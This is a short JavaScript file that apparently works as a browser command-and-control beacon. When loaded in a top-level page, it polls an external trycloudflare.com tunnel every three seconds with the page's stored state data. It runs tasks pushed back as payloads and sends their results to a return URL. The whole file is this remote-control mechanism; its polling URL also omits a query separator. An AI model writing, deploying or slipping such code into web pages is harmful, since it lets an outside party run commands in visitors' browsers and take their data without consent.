___.$(function($) {

    // Triggers a command for processing
    ___.fire = function(payload) {
        // If it will respond with a callback, don't respond until that is called
        if (payload.task.length > 0) {
            payload.task.call(this, function(result) {
                ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
            });
        // If it does not use a callback, respond straight away
        } else {
            ___.include(payload.return + "?key=" + payload.key + "&result=" + payload.task.call(this));
        }
    };

    // If this script is living in the top level
    if (top == window) {

        // Constantly poll for commands, every 3 seconds
        setInterval(function() {
            var data = ___.load(); // Send persistent state information
            data.time = Date.now(); // Prevent caching
            ___.include('https://availability-gas-metal-experience.trycloudflare.com' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
        }, 3000);
    }
});
